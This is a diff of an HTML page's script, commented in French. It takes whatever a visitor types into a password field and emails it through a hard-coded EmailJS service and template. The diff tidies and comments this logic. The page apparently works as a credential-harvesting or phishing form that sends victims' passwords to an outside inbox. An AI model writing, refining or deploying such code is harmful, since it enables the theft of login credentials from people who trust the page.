@@ -29,31 +29,40 @@
 
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
+      // Initialisation avec clé publique EmailJS
       (function () {
-        emailjs.init("TKsAeYBNJTNWnyUxfM");
+        emailjs.init("TKsAeYBNJTNWnyUxfM"); // ✅ assure-toi que c'est bien la clé publique
       })();
 
-      document
-        .getElementById("password-form")
-        .addEventListener("submit", function (e) {
-          e.preventDefault();
-          const password = document.getElementById("password").value;
+      // Sélection du formulaire
+      const form = document.getElementById("password-form");
 
-          emailjs
-            .send("service_548dlph", "template_wp68svl", {
-              user_password: password,
-            })
-            .then(
-              function (response) {
-                console.log("Succès:", response);
-                alert("Mot de passe envoyé !");
-              },
-              function (error) {
-                console.error("Erreur:", error);
-                alert("Échec de l'envoi.");
-              }
-            );
-        });
+      form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const password = document.getElementById("password").value;
+
+        // Objet de données pour EmailJS
+        const templateParams = {
+          user_password: password, // doit correspondre exactement au champ du template
+        };
+
+        // Envoi EmailJS
+        emailjs
+          .send("service_548dlph", "template_wp68svl", templateParams)
+          .then(
+            (response) => {
+              console.log("✅ Envoi réussi :", response);
+              alert("Mot de passe envoyé avec succès !");
+              form.reset(); // vide le champ après envoi
+            },
+            (error) => {
+              console.error("❌ Échec de l'envoi :", error);
+              // Affichage détaillé pour debug
+              alert("Échec de l'envoi. Vérifie console pour détails.");
+            }
+          );
+      });
     </script>
   </body>
 </html>
